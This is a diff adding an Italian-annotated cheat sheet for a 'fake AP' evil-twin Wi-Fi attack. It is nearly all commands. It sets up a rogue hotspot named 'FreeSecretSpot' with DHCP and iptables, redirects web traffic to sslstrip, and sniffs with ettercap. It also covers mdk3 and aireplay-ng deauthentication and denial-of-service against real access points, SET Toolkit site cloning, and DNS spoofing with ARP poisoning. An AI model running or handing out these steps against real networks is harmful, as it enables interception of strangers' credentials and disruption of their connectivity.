@@ -1,0 +1,115 @@
+FAKE AP ATTACK
+
+
+
+
+
+# SETTING #
+
+
++ route -n
+
++ apt-get install dhcp3-server
+
++ nano /etc/dhcpd.conf
+Inserire:
+authoritative;
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.168.1.0 netmask 255.255.255.0 { 
+option routers 192.168.1.1;
+option subnet-mask 255.255.255.0;
+option domain-name "FreeSecretSpot";
+option domain-name-servers 192.168.1.1;
+range 192.168.1.2 192.168.1.40;
+}
+
++ airmon-ng INTERFACE
+
++ airbase-ng -c 11 -e FreeSecretSpot INTERFACE
+
++ ifconfig at0 192.168.1.1 netmask 255.255.255.0
+
++ ifconfig at0 mtu 1400
+
++ route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
++ echo 1 > /proc/sys/net/ipv4/ip_forward
+
++ iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
+
++ iptables -P FORWARD ACCEPT
+
++ iptables --append FORWARD --in-interface at0 -j ACCEPT
+
++ iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+
++ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
++ dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
+
++ /etc/init.d/isc-dhcp-server start
+
+
+
+_set tools in ascolto_
+
++ sslstrip -f  -p -k 100000
+
++ ettercap -p -u -T -q -i at0
+
+
+
+
+
+
+# SETTING WITH SETOOLKIT #
+
+
+modifica di "/etc/hosts" per redirect.
+
++ iwlist wlan0 scan
+
++ airmon-ng start wlan0 6
+
++ mdk3 wlan0mon d –b TEXTFILE –c 6			=> Effettua DOS/Deauth attack sugli AP wifi
++ mdk3 wlan0mon a -m -1 BSSID
++ aireplay-ng -0  1000 -a ACCESSPOINTMACADDRESS -h SOURCEMACADDRESS wlan0mon
+
+
+
+
+
+
+# SETTING WITH AIRBASE #
+
+
++ airmon-ng start wlan0 
+
++ airbase-ng -e 'ESSID' -c CHANNEL INTERFACE -v
+
++ nano Rules.sh						=> Controllare settaggi
+
++ ./Rules.sh
+
++ dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0 &
+
++ echo "1" > /proc/sys/net/ipv4/ip_forward
+
++ cd /exploits/set/					=> SET Toolkit per clone site
++ ./set
+
++ locate etter.dns					=> Edit file, aggiungere risoluzioni DNS
+
++ ettercap -G
+Set:
+dns_spoof
+arp Poisoning 						=> sniff remote connections
+start sniffing
+
+
+
+
+
+
+
